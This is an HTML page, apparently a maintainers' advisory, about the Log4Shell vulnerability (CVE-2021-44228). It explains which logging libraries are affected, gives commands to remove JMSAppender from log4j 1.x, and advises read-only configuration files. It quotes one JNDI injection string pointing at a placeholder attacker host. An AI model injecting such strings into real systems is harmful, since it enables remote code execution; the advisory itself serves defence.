      <h1>Comments on the CVE-2021-44228 vulnerability</h1>

      <h3>Preamble</h3>
      
      <p>The JNDI/LDAP/RMI/X serialization rabbit hole runs deep and
      leads to much uncertainty. <b>Thus, the contents of this page
      are the result of our current knowledge and are provided AS IS
      without warranty of any kind.</b></p>

      <h3>What is CVE-2021-44228?</h3>
      
      <p>CVE-2021-44228 is a vulnerability classified under the
      highest severity mark, i.e. 10 out of 10. It allows an attacker
      to execute arbitrary code by injecting attacker-controlled data
      into a logged message. As far as vulnerabilities are concerned,
      CVE-2021-44228 is probably as bad as it gets.
      </p>

      <p>Superlatives aside, it is important to understand the <a
      href="https://www.lunasec.io/docs/blog/log4j-zero-day/">mechanics
      of the vulnerability</a>. The exploit becomes effective when the
      attacker can inject a string containing a substring in the form
      "&dollar;&lbrace;jndi:ldap://some.attacker-controlled.site/&rbrace;".
      Opportunities for injecting such strings appear to be endless.
      </p>

      <p>Log4j 2.x is open for this attack because it performs a
      lookup, aka string substitution, using the JNDI protocol,
      whenever the "&dollar;&lbrace;jndi:...&rbrace;" string is found
      within a message parameter. As mentioned above, the contents of
      the message parameter can be injected quite easily by the
      attacker.</p>

      <h3>Is log4j 1.x vulnerable?</h3>

      <p class="highlight">As log4j 1.x does <span class="big
      green">NOT</span> offer a JNDI look-up mechanism at the message
      level, it does <span class="big green">NOT</span> suffer from
      CVE-2021-44228. </p>

      <p>Given that log4j version 1.x is still very widely deployed,
      perhaps 10 times more widely than log4j 2.x, we have been receiving a
      steady stream of questions regarding the vulnerability of log4j
      version 1.x.
      </p>

      <p><b>As log4j 1.x does <span class="big green">NOT</span> offer
      a JNDI look up mechanism at the message level, it does <span
      class="big green">NOT</span> suffer from CVE-2021-44228.</b></p>

      <p>However, log4j 1.x comes with <code>JMSAppender</code> which
      will perform a JNDI lookup if enabled in log4j's configuration
      file, i.e. <em>log4j.properties</em> or <em>log4j.xml</em>.</p>

      <p>An attacker who ALREADY has write access the log4j
      configuration file will need to add <code>JMSAppender</code>
      into the configuration poisoned with malicious connection
      parameters. Note that prior legitimate usage of
      <code>JMSAppender</code> is irrelevant to the ability of the
      attacker to mount a successful attack. </p>

      <p>Also note that poisoning the configuration file is not
      enough. The attacker also needs to force log4j to reload its
      configuration file with the poisoned parameters. Given that
      log4j 1.x does not offer automatic reloading, the poisoned
      configuratin file will typically only become effectve at
      application restart.</p>

      <p>Nevertheless, while not easy, such an attack is
      feasible. Thus it makes sense to make job of the attacker harder
      by removing <code>JMSAppender</code> altogether from
      <em>log4j-1.2.17.jar</em>.</p>

      <p>In the absence of a new log4j 1.x release, you can remove
      <code>JMSAppender</code> from the <em>log4j-1.2.17.jar</em>
      artifact yourself. Here is the  command:</p>

      <pre>   zip -d log4j-1.2.17.jar org/apache/log4j/net/JMSAppender.class</pre>

      <p>If you do not have access to 'zip', you can also use the
      'jar' command.</p>

      <pre>   #assuming log4j-1.2.17.jar exists in current directory
   mkdir tmp
   cd tmp
   jar xvf ../log4j-1.2.17.jar
   rm org/apache/log4j/net/JMSAppender.class
   jar cvf ../log4j-1.2.17-patched.jar .</pre>

      <p>It goes without saying that once <em>log4j-1.2.17.jar</em> is
      patched, you would need to deploy it.</p>
      
      <h3>How about the SLF4J API?</h3>
     
      <p>The SLF4J API is just an API which lets message data go
      through. As such, using log4j 2.x, even via SLF4J does not
      mitigate the vulnerability.
      </p>

      <p>However, as mentioned already, log4j 1.x is safe with respect
      to CVE-2021-44228. Thus, if your SLF4J provider/binding is
      <em>slf4j-logj12.jar</em>, you are safe regarding
      CVE-2021-44228.</p>

      <p>If you are using <em>log4j-over-slf4j.jar</em> in conjections
      with the SLF4J API, you are safe unless the underlying
      implementation is log4j 2.x.</p>
      
      <h3>Does a similar vulnerability exist in logback?</h3>

      <p>Logback does <span class="big green">NOT</span> offer a
      lookup mechanism at the message level. Thus, it is deemed safe
      with respect to CVE-2021-44228.</p>

      <p>However, logback may make JNDI calls from within its
      configuration file. This was <a
      href="https://github.com/cn-panda/logbackRceDemo">recently
      reported</a> as a vulnerability of <span class="big
      green">lesser</span> severity. In response, we have released
      logback version 1.2.8. Please upgrade.
      </p>

      <p>Note that the vulnerability affecting logback requires write
      access to logback's configuration file as a prerequisite. To
      escalate to a succesful Remote Code Execution attack, ALL of the
      following conditions have to be met:
      </p>
      
    
      <ol>
        <li>attacker has write access to logback.xml</li>      
        <li>use of logback version older than 1.2.8</li>
        <li>loading of poisoned configuration data, which implies
        application restart or scan="true" set prior to attack</li>
      </ol>

      <p>As a belt-and-suspenders type of precaution, in addition to
      upgrading to logback version 1.2.8, we also recommend users to
      deploy their logback configuration files as read-only.</p>


      <h3 class="doAnchor" name="concreteMeasures">Additional protective
      measure: write protect log4j{1,2}/logback configuration
      files</h3>

      <p>While there are obviously differences between JNDI/LDAP/RMI
      serialization attacks, from an abstract point of view, they are
      all related to serialization, the gift that keeps giving.</p>
      
      <p>At this point, we hope that you appreciate the distinction
      between serialization attacks where malicious input is injected
      via "log message data" versus a "configuration file". The point of
      injection matters a lot. The former attack point requires no
      privilege whereas the latter requires significant prior
      privilege. If you understand the difference, please read on.</p>
      
      <p>While log4j 1.x is old, it is still very extensible. So are
      logback and log4j 2.x. </p>

      <p></p>

      <p>Trying to harden <code>JMSAppender</code> in log4j 1.x or
      some other component in log4j 2.x or logback against
      serialization injections (via configuration files) will be a
      long and ardous task. Moreover, we think you should err on the
      side of caution by assuming that there will remain hidden
      vulnerabilities.</p>

      <p class="highlight">We recommend that you err on the side of
      caution by deploying configuration files with read-only
      permissions.</p>

      
      <p>Therefore, in addition to hardening KNOWN vulnerable
      components, we also recommend that configuration files be
      protected against write access. In Unix-speak they should have
      read-only permissions for all users, including the
      <code>owner</code>. If possible, they should also be monitored
      against changes and unauthorized manipulation.</p>
